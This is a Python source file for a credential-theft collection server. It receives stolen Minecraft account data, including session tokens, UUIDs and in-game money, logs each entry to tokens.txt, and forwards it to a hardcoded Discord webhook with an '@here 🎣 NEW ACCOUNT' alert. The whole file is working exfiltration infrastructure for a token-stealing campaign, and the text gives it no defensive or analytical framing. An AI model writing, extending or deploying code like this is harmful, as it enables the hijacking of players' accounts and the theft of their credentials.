from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            # Get ALL fields
            username = data.get('username', 'Unknown')
            uuid = data.get('uuid', '')
            server = data.get('server', '')
            token = data.get('token', '')
            money = data.get('money', '0')
            playtime = data.get('playtime', '0h')
            kills = data.get('kills', '0')
            deaths = data.get('deaths', '0')
            skin = data.get('skin', '')
            log_type = data.get('type', 'login')
            
            print(f"Got: {username} on {server}")
            
            # Save to file (ALWAYS works)
            with open('tokens.txt', 'a') as f:
                f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
            
            # Try Discord
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                # @here message
                ping_data = json.dumps({"content": "@here 🎣 NEW ACCOUNT"}).encode()
                req1 = urllib.request.Request(DISCORD_WEBHOOK, data=ping_data, headers=headers)
                urllib.request.urlopen(req1, timeout=5)
                
                # Embed with ALL data
                embed = {
                    "title": f"🎣 ACCOUNT - {username}",
                    "description": f"**Username:** {username}\n**UUID:** {uuid}\n**Server:** {server}\n**Money:** {money}\n**Playtime:** {playtime}\n**Kills:** {kills}\n**Deaths:** {deaths}",
                    "fields": [{"name": "Token", "value": f"||```{token}```||"}],
                    "color": 65280,
                    "thumbnail": {"url": skin if skin else f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
                }
                
                embed_data = json.dumps({"embeds": [embed]}).encode()
                req2 = urllib.request.Request(DISCORD_WEBHOOK, data=embed_data, headers=headers)
                urllib.request.urlopen(req2, timeout=5)
                
                print("Sent to Discord")
                
            except Exception as e:
                print(f"Discord error: {e}")
                # Data still saved to file!
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server running')

print("🚀 Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
